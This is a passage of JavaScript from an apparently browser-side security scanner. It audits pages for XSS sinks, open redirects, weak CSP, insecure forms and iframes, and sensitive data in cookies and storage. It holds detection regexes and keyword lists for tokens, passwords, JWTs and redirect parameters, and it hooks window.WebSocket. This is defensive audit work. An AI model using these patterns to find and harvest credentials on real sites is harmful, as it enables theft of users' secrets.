                this.log('⚠️ Hunt timed out - proceeding with available results', 'warn');
                this.scanAllVulnerabilities();
                return this.generateEnhancedReport();
            }
            throw error;
        }
    }

    // 🔍 SEARCH SPECIFIC VULNERABILITY
    searchVulnerability(vulnType) {
        if (this.results[vulnType]) {
            console.group(`🔍 SEARCH RESULTS: ${vulnType}`);
            if (this.results[vulnType].length > 0) {
                console.table(this.results[vulnType]);
            } else {
                console.log('✅ No vulnerabilities found');
            }
            console.groupEnd();
            return this.results[vulnType];
        } else {
            console.warn(`⚠️ Vulnerability type "${vulnType}" not found`);
            return [];
        }
    }

    // 📍 GET EXACT SOURCE CODE
    getSourceCode(sourceName, lineNumber, context = 3) {
        const script = this.scripts.find(s =>
            s.source.includes(sourceName) || s.source === sourceName
        );

        if (script) {
            const lines = script.content.split('\n');
            const start = Math.max(0, lineNumber - context - 1);
            const end = Math.min(lines.length, lineNumber + context);

            console.group(`📄 SOURCE CODE: ${sourceName} (Line ${lineNumber})`);
            for (let i = start; i < end; i++) {
                if (i === lineNumber - 1) {
                    console.warn(`👉 ${i + 1}: ${lines[i]}`);
                } else {
                    console.log(`${i + 1}: ${lines[i]}`);
                }
            }
            console.groupEnd();

            return lines.slice(start, end).join('\n');
        } else {
            console.warn(`⚠️ Source "${sourceName}" not found`);
            return null;
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🆕 BATCH 1: DOM ELEMENT SCANNING (Features 1, 5, 11, 12, 13)
    // ═══════════════════════════════════════════════════════════════════

    // FEATURE 1: DOM Security Audit - scan actual DOM elements for XSS sinks
    auditDOMSecurity() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const dangerousSinks = [
            { selector: '[onerror]', attribute: 'onerror', severity: 'HIGH', desc: 'onerror event handler - potential XSS sink' },
            { selector: '[onload]', attribute: 'onload', severity: 'MEDIUM', desc: 'onload event handler' },
            { selector: '[onclick]', attribute: 'onclick', severity: 'MEDIUM', desc: 'onclick event handler with inline code' },
            { selector: '[onmouseover]', attribute: 'onmouseover', severity: 'MEDIUM', desc: 'onmouseover event handler' },
            { selector: '[onfocus]', attribute: 'onfocus', severity: 'MEDIUM', desc: 'onfocus event handler' },
            { selector: '[onsubmit]', attribute: 'onsubmit', severity: 'MEDIUM', desc: 'onsubmit event handler' },
            { selector: '[oninput]', attribute: 'oninput', severity: 'MEDIUM', desc: 'oninput event handler' },
            { selector: '[onanimationend]', attribute: 'onanimationend', severity: 'LOW', desc: 'onanimationend event handler' },
            { selector: '[formaction]', attribute: 'formaction', severity: 'HIGH', desc: 'formaction attribute - dynamic form target' },
            { selector: '[xlink\\:href]', attribute: 'xlink:href', severity: 'MEDIUM', desc: 'SVG xlink:href - potential script execution' }
        ];

        dangerousSinks.forEach(sink => {
            try {
                const elements = document.querySelectorAll(sink.selector);
                elements.forEach(el => {
                    const value = el.getAttribute(sink.attribute) || '';
                    const isDynamic = /\$\{|location\.|document\.|window\.|eval\(|function/i.test(value);
                    findings.push({
                        feature: 'DOM Security Audit',
                        element: el.tagName.toLowerCase(),
                        attribute: sink.attribute,
                        value: value.substring(0, 120),
                        severity: isDynamic ? 'CRITICAL' : sink.severity,
                        dynamic: isDynamic,
                        description: sink.desc
                    });
                });
            } catch (e) { /* invalid selector - skip */ }
        });

        this.domAuditResults = findings;
        return findings;
    }

    // FEATURE 5: Open Redirect Detection - scan all links for redirect patterns
    detectOpenRedirects() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const redirectParams = [
            'url', 'next', 'redirect', 'redirect_url', 'redirect_uri', 'return',
            'return_url', 'return_to', 'rurl', 'dest', 'destination', 'continue',
            'target', 'go', 'out', 'view', 'to', 'path', 'redir', 'redirect_to',
            'next_url', 'callback', 'returnTo', 'checkout_url', 'cancel_url'
        ];

        const links = document.querySelectorAll('a[href], area[href]');
        links.forEach(link => {
            try {
                const url = new URL(link.href, window.location.origin);
                redirectParams.forEach(param => {
                    const paramValue = url.searchParams.get(param);
                    if (paramValue) {
                        const isExternal = /^https?:\/\//i.test(paramValue) && !paramValue.includes(window.location.hostname);
                        const hasJavascript = /^javascript:/i.test(paramValue);
                        findings.push({
                            feature: 'Open Redirect',
                            element: link.tagName.toLowerCase(),
                            href: link.href.substring(0, 150),
                            param: param,
                            value: paramValue.substring(0, 100),
                            severity: hasJavascript ? 'CRITICAL' : isExternal ? 'HIGH' : 'MEDIUM',
                            external: isExternal,
                            description: isExternal ? `External redirect to: ${paramValue}` : hasJavascript ? 'javascript: URI in redirect' : `Redirect parameter "${param}" found`
                        });
                    }
                });
            } catch (e) { /* malformed URL - skip */ }
        });

        this.openRedirectResults = findings;
        return findings;
    }

    // FEATURE 11: Form Action Hijacking - audit forms for security issues
    auditFormSecurity() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const forms = document.querySelectorAll('form');
        forms.forEach((form, idx) => {
            const action = form.getAttribute('action') || '';
            const method = (form.getAttribute('method') || 'GET').toUpperCase();
            const enctype = form.getAttribute('enctype') || '';
            const target = form.getAttribute('target') || '';
            const autocomplete = form.getAttribute('autocomplete');

            // Check for HTTP action
            if (/^http:\/\//i.test(action)) {
                findings.push({
                    feature: 'Form Security',
                    formIndex: idx,
                    action: action.substring(0, 150),
                    severity: 'HIGH',
                    description: 'Form submits to HTTP (not HTTPS) - credentials may be exposed'
                });
            }

            // Check for missing CSRF-like tokens
            const hasCsrfToken = form.querySelector('input[name*="csrf"], input[name*="token"], input[name*="_token"], input[type="hidden"][name*="auth"]');
            if (method === 'POST' && !hasCsrfToken) {
                findings.push({
                    feature: 'Form Security',
                    formIndex: idx,
                    action: action.substring(0, 150),
                    severity: 'MEDIUM',
                    description: 'POST form without visible CSRF token'
                });
            }

            // Check for sensitive fields without autocomplete=off
            const sensitiveInputs = form.querySelectorAll('input[type="password"], input[name*="password"], input[name*="secret"], input[name*="token"], input[name*="ssn"], input[name*="credit"]');
            if (sensitiveInputs.length > 0 && autocomplete !== 'off') {
                findings.push({
                    feature: 'Form Security',
                    formIndex: idx,
                    action: action.substring(0, 150),
                    severity: 'LOW',
                    description: `Sensitive input fields found without autocomplete="off" (${sensitiveInputs.length} fields)`
                });
            }

            // Check for javascript: formaction
            const formActions = form.querySelectorAll('[formaction]');
            formActions.forEach(fa => {
                const faVal = fa.getAttribute('formaction') || '';
                if (/^javascript:/i.test(faVal)) {
                    findings.push({
                        feature: 'Form Security',
                        formIndex: idx,
                        action: faVal.substring(0, 100),
                        severity: 'CRITICAL',
                        description: 'formaction contains javascript: URI'
                    });
                }
            });

            // Check for target=_blank without rel=noopener
            if (target === '_blank') {
                findings.push({
                    feature: 'Form Security',
                    formIndex: idx,
                    severity: 'MEDIUM',
                    description: 'Form opens in new tab (target=_blank) - check for rel=noopener'
                });
            }
        });

        this.formAuditResults = findings;
        return findings;
    }

    // FEATURE 12: iframe Security Check
    auditIframeSecurity() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const iframes = document.querySelectorAll('iframe');
        iframes.forEach((iframe, idx) => {
            const src = iframe.getAttribute('src') || '';
            const sandbox = iframe.getAttribute('sandbox');
            const allow = iframe.getAttribute('allow') || '';
            const loading = iframe.getAttribute('loading') || '';

            // No sandbox at all
            if (!sandbox) {
                findings.push({
                    feature: 'iframe Security',
                    iframeIndex: idx,
                    src: src.substring(0, 150),
                    severity: 'HIGH',
                    description: 'iframe without sandbox attribute - full capabilities available'
                });
            } else if (sandbox === '') {
                // Empty sandbox = everything restricted (good)
            } else {
                // Check for dangerous sandbox permissions
                if (sandbox.includes('allow-scripts') && sandbox.includes('allow-same-origin')) {
                    findings.push({
                        feature: 'iframe Security',
                        iframeIndex: idx,
                        src: src.substring(0, 150),
                        severity: 'CRITICAL',
                        severityReason: 'sandbox allows scripts + same-origin - can remove sandbox via DOM',
                        description: 'sandbox="allow-scripts allow-same-origin" - iframe can break out of sandbox'
                    });
                }
                if (sandbox.includes('allow-top-navigation')) {
                    findings.push({
                        feature: 'iframe Security',
                        iframeIndex: idx,
                        src: src.substring(0, 150),
                        severity: 'HIGH',
                        description: 'sandbox allows top navigation - potential tab-nabbing'
                    });
                }
            }

            // Check for dangerous allow permissions
            if (allow.includes('autoplay') || allow.includes('encrypted-media')) {
                findings.push({
                    feature: 'iframe Security',
                    iframeIndex: idx,
                    src: src.substring(0, 150),
                    severity: 'LOW',
                    description: `iframe requests media permissions: allow="${allow}"`
                });
            }

            // Check for HTTP src on HTTPS page
            if (/^http:\/\//i.test(src) && window.location.protocol === 'https:') {
                findings.push({
                    feature: 'iframe Security',
                    iframeIndex: idx,
                    src: src.substring(0, 150),
                    severity: 'HIGH',
                    description: 'Mixed content: HTTP iframe loaded on HTTPS page'
                });
            }

            // Check for about:blank src
            if (src === 'about:blank' || src === '') {
                findings.push({
                    feature: 'iframe Security',
                    iframeIndex: idx,
                    src: src,
                    severity: 'INFO',
                    description: 'Empty/about:blank iframe - may be used for DOM clobbering or dynamic content'
                });
            }
        });

        this.iframeAuditResults = findings;
        return findings;
    }

    // FEATURE 13: JavaScript URL Protocol Audit
    auditJavascriptURLs() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const urlAttributes = ['href', 'src', 'action', 'formaction', 'data', 'poster', 'background', 'cite', 'codebase', 'dynsrc', 'lowsrc'];

        urlAttributes.forEach(attr => {
            const elements = document.querySelectorAll(`[${attr}]`);
            elements.forEach(el => {
                const value = el.getAttribute(attr) || '';
                if (/^javascript:/i.test(value.trim())) {
                    findings.push({
                        feature: 'JavaScript URL',
                        element: el.tagName.toLowerCase(),
                        attribute: attr,
                        value: value.substring(0, 150),
                        severity: 'CRITICAL',
                        description: `javascript: URI in ${attr} attribute - direct code execution`
                    });
                }
            });
        });

        // Also scan for javascript: in inline event handlers
        const allElements = document.querySelectorAll('*');
        const eventAttrs = ['onclick', 'ondblclick', 'onmousedown', 'onmouseup', 'onmouseover', 'onmouseout',
            'onkeydown', 'onkeypress', 'onkeyup', 'onfocus', 'onblur', 'onsubmit', 'onreset',
            'onselect', 'onchange', 'onload', 'onerror', 'onabort', 'onresize', 'onscroll',
            'oncontextmenu', 'oninput', 'oninvalid', 'onsearch'];

        eventAttrs.forEach(attr => {
            const elements = document.querySelectorAll(`[${attr}]`);
            elements.forEach(el => {
                const value = el.getAttribute(attr) || '';
                if (/javascript\s*:/i.test(value)) {
                    findings.push({
                        feature: 'JavaScript URL',
                        element: el.tagName.toLowerCase(),
                        attribute: attr,
                        value: value.substring(0, 150),
                        severity: 'CRITICAL',
                        description: `javascript: URI in ${attr} event handler`
                    });
                }
            });
        });

        // Scan data-* attributes for javascript: URIs
        const dataElements = document.querySelectorAll('[data-href], [data-src], [data-url], [data-link], [data-redirect]');
        dataElements.forEach(el => {
            Array.from(el.attributes).forEach(attr => {
                if (attr.name.startsWith('data-') && /^javascript:/i.test(attr.value.trim())) {
                    findings.push({
                        feature: 'JavaScript URL',
                        element: el.tagName.toLowerCase(),
                        attribute: attr.name,
                        value: attr.value.substring(0, 150),
                        severity: 'HIGH',
                        description: `javascript: URI in ${attr.name} data attribute`
                    });
                }
            });
        });

        this.jsUrlResults = findings;
        return findings;
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🆕 BATCH 2: SECURITY HEADERS & STORAGE (Features 2, 3, 4, 8)
    // ═══════════════════════════════════════════════════════════════════

    // FEATURE 2: CSP Header Analysis
    analyzeCSP() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const metaTags = document.querySelectorAll('meta[http-equiv]');
        let cspContent = null;

        metaTags.forEach(meta => {
            if (meta.getAttribute('http-equiv')?.toLowerCase() === 'content-security-policy') {
                cspContent = meta.getAttribute('content') || '';
            }
        });

        if (!cspContent) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'HIGH',
                directive: 'MISSING',
                value: 'No Content-Security-Policy meta tag found',
                description: 'Page has no CSP - vulnerable to XSS, data injection, and code injection'
            });
            this.cspResults = findings;
            return findings;
        }

        const directives = cspContent.split(';').map(d => d.trim()).filter(Boolean);
        const parsed = {};
        directives.forEach(d => {
            const [key, ...rest] = d.split(/\s+/);
            parsed[key.toLowerCase()] = rest;
        });

        // Check for unsafe-inline
        if (parsed['script-src']?.includes("'unsafe-inline'") || parsed['default-src']?.includes("'unsafe-inline'")) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'CRITICAL',
                directive: 'script-src',
                value: "'unsafe-inline'",
                description: "CSP allows 'unsafe-inline' for scripts - XSS payloads can execute freely"
            });
        }

        // Check for unsafe-eval
        if (parsed['script-src']?.includes("'unsafe-eval'") || parsed['default-src']?.includes("'unsafe-eval'")) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'CRITICAL',
                directive: 'script-src',
                value: "'unsafe-eval'",
                description: "CSP allows 'unsafe-eval' - eval(), Function(), setTimeout(string) work"
            });
        }

        // Check for wildcard script sources
        if (parsed['script-src']?.includes('*') || parsed['default-src']?.includes('*')) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'CRITICAL',
                directive: 'script-src',
                value: '*',
                description: 'CSP script-src has wildcard - scripts can load from any origin'
            });
        }

        // Check for data: in script-src
        if (parsed['script-src']?.includes('data:') || parsed['default-src']?.includes('data:')) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'HIGH',
                directive: 'script-src',
                value: 'data:',
                description: "CSP allows data: URIs for scripts - inline script execution possible"
            });
        }

        // Check for blob: in script-src
        if (parsed['script-src']?.includes('blob:') || parsed['default-src']?.includes('blob:')) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'MEDIUM',
                directive: 'script-src',
                value: 'blob:',
                description: "CSP allows blob: URIs for scripts"
            });
        }

        // Check for missing object-src
        if (!parsed['object-src'] && !parsed['default-src']) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'MEDIUM',
                directive: 'object-src',
                value: 'MISSING',
                description: 'CSP has no object-src directive - plugin content unrestricted'
            });
        }

        // Check for missing base-uri
        if (!parsed['base-uri']) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'MEDIUM',
                directive: 'base-uri',
                value: 'MISSING',
                description: 'CSP has no base-uri directive - base tag injection possible'
            });
        }

        // Check for missing form-action
        if (!parsed['form-action']) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'MEDIUM',
                directive: 'form-action',
                value: 'MISSING',
                description: 'CSP has no form-action directive - form hijacking possible'
            });
        }

        // Check for missing frame-ancestors
        if (!parsed['frame-ancestors']) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'MEDIUM',
                directive: 'frame-ancestors',
                value: 'MISSING',
                description: 'CSP has no frame-ancestors - clickjacking possible'
            });
        }

        // Check for report-uri (good practice)
        if (!parsed['report-uri'] && !parsed['report-to']) {
            findings.push({
                feature: 'CSP Analysis',
                severity: 'INFO',
                directive: 'report-uri',
                value: 'MISSING',
                description: 'CSP has no reporting directive - violations are silent'
            });
        }

        this.cspResults = findings;
        return findings;
    }

    // FEATURE 3: Cookie Security Audit
    auditCookieSecurity() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const cookies = document.cookie.split(';').map(c => c.trim()).filter(Boolean);

        if (cookies.length === 0) {
            this.cookieAuditResults = findings;
            return findings;
        }

        cookies.forEach(cookie => {
            const [name, ...valueParts] = cookie.split('=');
            const value = valueParts.join('=');
            const cookieName = name.trim().toLowerCase();

            // Sensitive data in cookies
            const sensitivePatterns = [
                { pattern: /token|jwt|auth|session|access/i, desc: 'Potential auth token in cookie', severity: 'HIGH' },
                { pattern: /password|passwd|pwd|secret|key/i, desc: 'Password/secret in cookie', severity: 'CRITICAL' },
                { pattern: /credit|card|ccn|cvv|ssn|social/i, desc: 'Payment/PII data in cookie', severity: 'CRITICAL' },
                { pattern: /email|phone|address|name/i, desc: 'PII data in cookie', severity: 'MEDIUM' }
            ];

            sensitivePatterns.forEach(sp => {
                if (sp.pattern.test(name.trim())) {
                    findings.push({
                        feature: 'Cookie Security',
                        cookie: name.trim(),
                        valueLength: value.length,
                        severity: sp.severity,
                        description: sp.desc
                    });
                }
            });

            // Check if cookie value looks like base64 encoded data
            if (value.length > 20 && /^[A-Za-z0-9+/=_-]+$/.test(value)) {
                findings.push({
                    feature: 'Cookie Security',
                    cookie: name.trim(),
                    severity: 'MEDIUM',
                    description: 'Cookie value appears to be base64 encoded - may contain sensitive data'
                });
            }

            // Check if cookie value looks like a JWT
            if (/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(value)) {
                findings.push({
                    feature: 'Cookie Security',
                    cookie: name.trim(),
                    severity: 'HIGH',
                    description: 'Cookie contains what appears to be a JWT token'
                });
            }
        });

        // Check via response headers if possible (meta tag or performance API)
        // Note: HttpOnly and Secure flags can't be read from JS, which is the point

        this.cookieAuditResults = findings;
        return findings;
    }

    // FEATURE 4: Storage Sensitive Data Scan
    auditStorageSecurity() {
        const findings = [];

        const sensitivePatterns = [
            { pattern: /token|jwt|auth|session|access/i, desc: 'Auth token in storage', severity: 'HIGH' },
            { pattern: /password|passwd|pwd|secret|key/i, desc: 'Password/secret in storage', severity: 'CRITICAL' },
            { pattern: /credit|card|ccn|cvv|ssn/i, desc: 'Payment data in storage', severity: 'CRITICAL' },
            { pattern: /email|phone|address|name|user/i, desc: 'PII in storage', severity: 'MEDIUM' },
            { pattern: /api[_-]?key|apikey/i, desc: 'API key in storage', severity: 'HIGH' },
            { pattern: /private[_-]?key|secret[_-]?key/i, desc: 'Private key in storage', severity: 'CRITICAL' }
        ];

        // Scan localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key) || '';
                const keyLower = key.toLowerCase();

                sensitivePatterns.forEach(sp => {
                    if (sp.pattern.test(key) || sp.pattern.test(value.substring(0, 200))) {
                        findings.push({
                            feature: 'Storage Security',
                            storage: 'localStorage',
                            key: key,
                            valueLength: value.length,
                            severity: sp.severity,
                            description: sp.desc
                        });
                    }
                });

                // Check for JWT in value
                if (/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/.test(value)) {
                    findings.push({
                        feature: 'Storage Security',
                        storage: 'localStorage',
                        key: key,
                        severity: 'HIGH',
                        description: 'localStorage contains JWT token'
                    });
                }

                // Check for base64 encoded blobs
                if (value.length > 50 && /^[A-Za-z0-9+/=_\s-]+$/.test(value) && value.length > 100) {
                    findings.push({
                        feature: 'Storage Security',
                        storage: 'localStorage',
                        key: key,
                        severity: 'LOW',
                        description: 'localStorage value appears to be base64 encoded'
                    });
                }

                // Check for JSON with nested sensitive data
                try {
                    const parsed = JSON.parse(value);
                    if (typeof parsed === 'object' && parsed !== null) {
                        const jsonStr = JSON.stringify(parsed).toLowerCase();
                        if (/password|secret|token|key/.test(jsonStr)) {
                            findings.push({
                                feature: 'Storage Security',
                                storage: 'localStorage',
                                key: key,
                                severity: 'HIGH',
                                description: 'localStorage JSON object contains sensitive field names'
                            });
                        }
                    }
                } catch (e) { /* not JSON - ok */ }
            }
        } catch (e) { /* localStorage blocked */ }

        // Scan sessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key) || '';

                sensitivePatterns.forEach(sp => {
                    if (sp.pattern.test(key) || sp.pattern.test(value.substring(0, 200))) {
                        findings.push({
                            feature: 'Storage Security',
                            storage: 'sessionStorage',
                            key: key,
                            valueLength: value.length,
                            severity: sp.severity,
                            description: sp.desc
                        });
                    }
                });

                if (/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/.test(value)) {
                    findings.push({
                        feature: 'Storage Security',
                        storage: 'sessionStorage',
                        key: key,
                        severity: 'HIGH',
                        description: 'sessionStorage contains JWT token'
                    });
                }
            }
        } catch (e) { /* sessionStorage blocked */ }

        this.storageAuditResults = findings;
        return findings;
    }

    // FEATURE 8: WebSocket Security Analysis
    analyzeWebSocketSecurity() {
        const findings = [];
        this._wsInstances = [];

        const OrigWebSocket = window.WebSocket;
        const self = this;

        window.WebSocket = function(url, protocols) {
            const ws = protocols ? new OrigWebSocket(url, protocols) : new OrigWebSocket(url);

            try {
                const urlObj = new URL(url);
                const isWss = urlObj.protocol === 'wss:';
                const isSameOrigin = urlObj.origin === window.location.origin;

                const wsInfo = {
                    url: url.substring(0, 150),
                    protocol: urlObj.protocol,
                    origin: urlObj.origin,
                    secure: isWss,
                    sameOrigin: isSameOrigin,
                    timestamp: Date.now()
                };

                self._wsInstances.push(wsInfo);

                if (!isWss) {
                    findings.push({
                        feature: 'WebSocket Security',
                        url: url.substring(0, 150),
                        severity: 'HIGH',
                        description: `WebSocket uses ${urlObj.protocol} - data transmitted in plaintext`
                    });
                }

                if (!isSameOrigin) {
                    findings.push({
                        feature: 'WebSocket Security',
                        url: url.substring(0, 150),
                        severity: 'MEDIUM',
                        description: `Cross-origin WebSocket to ${urlObj.origin}`
                    });
                }
            } catch (e) { /* malformed URL */ }

            // Hook message handler for validation
            const origAddEventListener = ws.addEventListener.bind(ws);
            ws.addEventListener = function(type, listener, options) {
                if (type === 'message') {
                    const wrappedListener = function(event) {
                        const data = typeof event.data === 'string' ? event.data : '';
                        if (data.length > 10000) {
                            findings.push({
                                feature: 'WebSocket Security',
                                url: url.substring(0, 100),
                                severity: 'MEDIUM',
                                description: `WebSocket received very large message (${data.length} chars)`
                            });
                        }
                        return listener.call(this, event);
                    };
                    return origAddEventListener(type, wrappedListener, options);
                }
                return origAddEventListener(type, listener, options);
            };

            return ws;
        };

        window.WebSocket.prototype = OrigWebSocket.prototype;
        window.WebSocket.CONNECTING = OrigWebSocket.CONNECTING;
        window.WebSocket.OPEN = OrigWebSocket.OPEN;
        window.WebSocket.CLOSING = OrigWebSocket.CLOSING;
        window.WebSocket.CLOSED = OrigWebSocket.CLOSED;

        this.wsAnalysisResults = findings;
        this._originalWebSocket = OrigWebSocket;
        return findings;
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🆕 BATCH 3: EXTERNAL RESOURCES & URLs (Features 7, 9, 14, 19)
    // ═══════════════════════════════════════════════════════════════════

    // FEATURE 7: SRI (Subresource Integrity) Check
    checkSubresourceIntegrity() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const externalResources = document.querySelectorAll('script[src], link[rel="stylesheet"][href], link[as="script"][href], link[as="font"][href]');
        let totalExternal = 0;
        let missingSRI = 0;

        externalResources.forEach(el => {
            const src = el.getAttribute('src') || el.getAttribute('href') || '';
            if (!src || src.startsWith('data:') || src.startsWith('blob:')) return;

            totalExternal++;
            const integrity = el.getAttribute('integrity');
            const crossorigin = el.getAttribute('crossorigin');

            if (!integrity) {
                missingSRI++;
                let severity = 'MEDIUM';
                try {
                    const urlObj = new URL(src, window.location.origin);
                    if (urlObj.origin !== window.location.origin) {
                        severity = 'HIGH';
                    }
                } catch (e) { /* relative URL */ }

                findings.push({
                    feature: 'SRI Check',
                    element: el.tagName.toLowerCase(),
                    src: src.substring(0, 150),
                    severity: severity,
                    description: `External resource missing integrity attribute - supply chain attack vector`
                });
            } else if (!crossorigin) {
                findings.push({
                    feature: 'SRI Check',
                    element: el.tagName.toLowerCase(),
                    src: src.substring(0, 150),
                    severity: 'LOW',
                    description: 'Has integrity but missing crossorigin attribute - may fail in some browsers'
                });
            }
        });

        if (totalExternal > 0 && missingSRI === totalExternal) {
            findings.push({
                feature: 'SRI Check',
                severity: 'HIGH',
                description: `ALL ${totalExternal} external resources lack SRI - zero supply chain protection`
            });
        }

        this.sriResults = findings;
        return { findings, totalExternal, missingSRI };
    }

    // FEATURE 9: Third-Party Script Risk Scorer
    scoreThirdPartyScripts() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const knownCDNs = {
            'cdn.jsdelivr.net': { risk: 'LOW', name: 'jsDelivr' },
            'cdnjs.cloudflare.com': { risk: 'LOW', name: 'cdnjs' },
            'unpkg.com': { risk: 'LOW', name: 'unpkg' },
            'fonts.googleapis.com': { risk: 'LOW', name: 'Google Fonts' },
            'ajax.googleapis.com': { risk: 'LOW', name: 'Google Hosted Libraries' },
            'code.jquery.com': { risk: 'LOW', name: 'jQuery CDN' },
            'stackpath.bootstrapcdn.com': { risk: 'LOW', name: 'BootstrapCDN' },
            'cdn.tailwindcss.com': { risk: 'MEDIUM', name: 'Tailwind CDN' },
            'www.googletagmanager.com': { risk: 'MEDIUM', name: 'Google Tag Manager' },
            'www.google-analytics.com': { risk: 'MEDIUM', name: 'Google Analytics' },
            'connect.facebook.net': { risk: 'MEDIUM', name: 'Facebook SDK' },
            'platform.twitter.com': { risk: 'MEDIUM', name: 'Twitter Widget' },
            'js.stripe.com': { risk: 'MEDIUM', name: 'Stripe.js' },
            'polyfill.io': { risk: 'HIGH', name: 'Polyfill.io (compromised)' },
            'cdn.polyfill.io': { risk: 'CRITICAL', name: 'Polyfill.io (known malicious)' }
        };

        const scripts = document.querySelectorAll('script[src]');
        const thirdPartyScripts = [];
        const sameOriginCount = scripts.length;

        scripts.forEach(el => {
            const src = el.getAttribute('src') || '';
            if (!src || src.startsWith('data:') || src.startsWith('blob:')) return;

            try {
                const urlObj = new URL(src, window.location.origin);
                const isSameOrigin = urlObj.origin === window.location.origin;

                if (!isSameOrigin) {
                    const hostname = urlObj.hostname;
                    const known = knownCDNs[hostname];

                    let riskScore = 50;
                    let riskLevel = 'MEDIUM';
                    let name = hostname;

                    if (known) {
                        name = known.name;
                        riskLevel = known.risk;
                        riskScore = known.risk === 'LOW' ? 20 : known.risk === 'MEDIUM' ? 50 : known.risk === 'HIGH' ? 80 : 95;
                    } else {
                        riskScore = 60;
                        riskLevel = 'MEDIUM';
                        // Unknown CDN = slightly higher risk
                        if (!hostname.includes('cdn') && !hostname.includes('static')) {
                            riskScore = 70;
                        }
                    }

                    // Check for permissions requested
                    const permissions = el.getAttribute('permissions') || '';
                    if (permissions) {
                        riskScore += 10;
                    }

                    // Check for async/defer (good practice)
                    const isAsync = el.hasAttribute('async');
                    const isDefer = el.hasAttribute('defer');

                    thirdPartyScripts.push({
                        feature: 'Third-Party Risk',
                        hostname: hostname,
                        name: name,
                        src: urlObj.pathname.substring(0, 80),
                        riskScore: Math.min(riskScore, 100),
                        severity: riskLevel,
                        async: isAsync,
                        defer: isDefer,
                        permissions: permissions,
                        description: `Third-party script from ${hostname} - Risk: ${riskLevel} (${riskScore}/100)`
                    });
                }
            } catch (e) { /* malformed URL */ }
        });

        // Sort by risk score descending
        thirdPartyScripts.sort((a, b) => b.riskScore - a.riskScore);

        this.thirdPartyResults = thirdPartyScripts;
        return thirdPartyScripts;
    }

    // FEATURE 14: Hardcoded URL/Endpoint Extractor
    extractURLsFromScripts() {
        const urls = {
            internal: [],
            external: [],
            api: [],
            admin: [],
            debug: [],
            staging: [],
            cloud: [],
            auth: []
        };

        const urlRegex = /(?:https?:\/\/|ws:\/\/|wss:\/\/)[^\s"'`<>\)]+/gi;
        const apiPatterns = /\/api\/|\/v1\/|\/v2\/|\/graphql|\/rest\//i;
        const adminPatterns = /\/admin|\/dashboard|\/manage|\/console|\/panel|\/cms/i;
        const debugPatterns = /\/debug|\/test|\/staging|\/dev\/|\/_internal|\/trace|\/actuator/i;
        const stagingPatterns = /\.staging\.|\.dev\.|\.test\.|staging\.|\.preview\.|\.sandbox\./i;
        const cloudPatterns = /amazonaws\.com|azure\.com|googleapis\.com|cloudfront\.net|s3\.amazonaws/i;
        const authPatterns = /\/auth|\/login|\/oauth|\/saml|\/sso|\/callback|\/token/i;

        this.scripts.forEach(script => {
            if (script.type === 'external-blocked' || script.type === 'external-empty') return;
            if (!script.content || script.content.startsWith('// External script:')) return;

            const content = script.content;
            const source = script.source.split('/').pop() || script.source;
            let match;

            const regex = new RegExp(urlRegex.source, urlRegex.flags);
            while ((match = regex.exec(content)) !== null) {
                const url = match[0].replace(/[.,;:)\]"']+$/, '');
                if (url.length < 10 || url.length > 500) continue;

                const isInternal = url.includes(window.location.hostname) ||
                    /^https?:\/\/(localhost|127\.0\.0\.1|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/i.test(url);

                const entry = { url: url.substring(0, 200), source: source };

                if (isInternal) {
                    urls.internal.push(entry);
                } else {
                    urls.external.push(entry);
                }

                if (apiPatterns.test(url)) urls.api.push(entry);
                if (adminPatterns.test(url)) urls.admin.push(entry);
                if (debugPatterns.test(url)) urls.debug.push(entry);
                if (stagingPatterns.test(url)) urls.staging.push(entry);
                if (cloudPatterns.test(url)) urls.cloud.push(entry);
                if (authPatterns.test(url)) urls.auth.push(entry);
            }
        });

        // Deduplicate
        Object.keys(urls).forEach(key => {
            const seen = new Set();
            urls[key] = urls[key].filter(entry => {
                if (seen.has(entry.url)) return false;
                seen.add(entry.url);
                return true;
            });
        });

        this.extractedURLs = urls;
        return urls;
    }

    // FEATURE 19: External Script Dependency Graph
    buildDependencyGraph() {
        const graph = {
            nodes: [],
            edges: [],
            rootScripts: [],
            loadedScripts: []
        };

        if (typeof document === 'undefined') return graph;

        const allScripts = document.querySelectorAll('script[src]');
        const scriptURLs = new Set();

        allScripts.forEach(el => {
            const src = el.getAttribute('src') || '';
            if (!src) return;
            try {
                const urlObj = new URL(src, window.location.origin);
                scriptURLs.add(urlObj.href);
                graph.nodes.push({
                    id: urlObj.href,
                    hostname: urlObj.hostname,
                    pathname: urlObj.pathname.substring(0, 80),
                    isSameOrigin: urlObj.origin === window.location.origin,
                    async: el.hasAttribute('async'),
                    defer: el.hasAttribute('defer'),
                    type: el.getAttribute('type') || 'text/javascript'
                });
            } catch (e) { /* malformed */ }
        });

        // Scan script content for dynamic script loading patterns
        this.scripts.forEach(script => {
            if (!script.content || script.content.startsWith('// External script:')) return;

